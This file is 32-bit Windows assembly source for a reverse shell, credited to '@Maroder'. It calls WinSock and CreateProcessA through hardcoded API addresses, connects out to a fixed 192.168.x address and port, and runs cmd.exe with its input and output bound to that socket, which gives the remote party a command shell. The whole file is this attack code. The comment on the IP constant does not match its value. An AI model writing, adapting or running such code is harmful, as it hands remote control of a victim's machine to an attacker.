; ========================
; @Maroder
; @for DevGnode 
; nasm -f win32 reverse_shell.s -o reverse_shell.o
; ld -m i386 reverse_shell.o -o reverse_shell32.exe
;=========================
[BITS 32]

; import ws2_32.dll
; extern WSAStartup, WSASocket, WSAConnect
; import kernel32.dll
; extern CreateProcessA

%define HANDLE DWORD
%define SOCKET DWORD

WSADESCRIPTION_LEN equ 	256
WSASYS_STATUS_LEN equ 	128

; ========================
; Structure
;=========================
struc STARTUPINFO
	.cb			resd	1
	.lpReserved		resd	1
	.lpDesktop		resd	1
	.lpTitle		resd	1
	.dwX			resd	1
	.dwY			resd	1
	.dwXSize		resd	1
	.dwYSize		resd	1
	.dwXCountChars		resd	1
	.dwYCountChars		resd	1
	.dwFillAttribute	resd	1
	.dwFlags		resd	1
	.wShowWindow		resw	1
	.cbReserved2		resw	1
	.lpReserved2		resd	1
	.hStdInput		resd	1
	.hStdOutput		resd	1
	.hStdError		resd	1
endstruc

struc PROCESS_INFORMATION
	.hProcess		resd	1
	.hThread		resd	1
	.dwProcessId		resd	1
	.dwThreadId		resd	1
endstruc

struc WSAData
	.wVersion		resw	1
	.wHighVersion		resw	1
	.iMaxSockets		resw	1
	.iMaxUdpDg		resw	1
	.lpVendorInfo		resd	1
	.szDescription		resb 	WSADESCRIPTION_LEN + 1
	.szSystemStatus		resb	WSASYS_STATUS_LEN + 1
endstruc

struc IN_ADDR
	.s_addr		resd	1
endstruc
struc SOCKADDR_IN
	.sin_family	resw	1
	.sin_port	resw	1
	.sin_addr	resd	1
	.sin_zero	resb	8
endstruc


	global _start
; ========================
; DATA
;=========================
section .data
	LoadLibraryA: 	dd	0x7C801D7B

	ws2_32:	db "ws2_32.dll",0

; ========================
; Pointer
;=========================
section .bss
	ssi resb 0x44
	spi resb 0x10
	swd resb 0x10A
	sss resb 0x10
	sin resb 0x4
; ========================
; text
;=========================
section .text

_start:
	
	
	push ws2_32		; push ws2_32.dll
	mov edi, LoadLibraryA	; LoadLibraryA
	call edi		; call

	mov ebp, esp		; stack
	sub esp, 0x04		; size 4 SOCKET HANDLE
	
	WSAStartup:
	xor eax, eax
	push swd
	mov ax,0x0202
	push eax
	mov edi, 0x719F6A55 
	call edi

	WSASocket:
	xor eax,eax
	push eax
	push eax
	push eax
	mov al,0x06	; IPPROTO_TCP
	push eax	;
	sub al,0x05	; SOCK_STREAM
	push eax	;
	add al,0x01	; AF_INET
	push eax
	mov edi,0x719F8B6A
	call edi	

	; socket Handle
	mov edx,eax
	mov SOCKET[esp],edx
	
	; SOCKADDR_IN
	xor ebx, ebx
	inc ebx
	inc ebx
	mov WORD[ sss + SOCKADDR_IN.sin_family ],bx	; 
	mov bx,0x5D11					; port
	mov WORD[ sss + SOCKADDR_IN.sin_port ],bx
	mov eax, DWORD[ip]
	mov DWORD[ sss + SOCKADDR_IN.sin_addr ], eax
	
	
	WSAConnect:
	xor eax,eax		; raz eax
	push eax		; 
	push eax		;
	push eax		;
	push eax		;
	mov al,0x10		; sizeof SOCKADDR
	push eax		;
	mov eax,sss 		; SOCKADDR
	push eax		;
	;mov eax, edx		; socket Handle
	push edx
	mov edi, 0x71A00C81
	call edi
	
	cmp eax,0xFFFFFFFF
	je ret

	xor eax,eax
	mov edx, [esp]
	mov ah,0x01
	inc eax
	mov DWORD[ ssi + STARTUPINFO.dwFlags ], eax
	mov DWORD[ ssi + STARTUPINFO.hStdInput ], edx
	mov DWORD[ ssi + STARTUPINFO.hStdOutput ], edx
	mov DWORD[ ssi + STARTUPINFO.hStdError ], edx

	; CreateProcess
	xor 	eax, eax
	push 	spi		; PROCESS_INFORMATION
	push 	ssi		; STARTUPINFO
	push 	eax		;
	push	eax		;
	push 	eax		;
	inc 	eax		;
	push 	eax		; true
	dec 	eax		;
	push 	eax		;
	push	eax		;
	push	_cmd		; Str CMD
	push	eax		;
	mov 	edi, 0x7C80236B	; CreateProcessA
	call	edi		; call

	ret:
	leave

	ip:	dd 0x0c01a8c0 	; 15.1.168.192 ->  192.168.1.15
	_cmd: 	db "cmd.exe",0
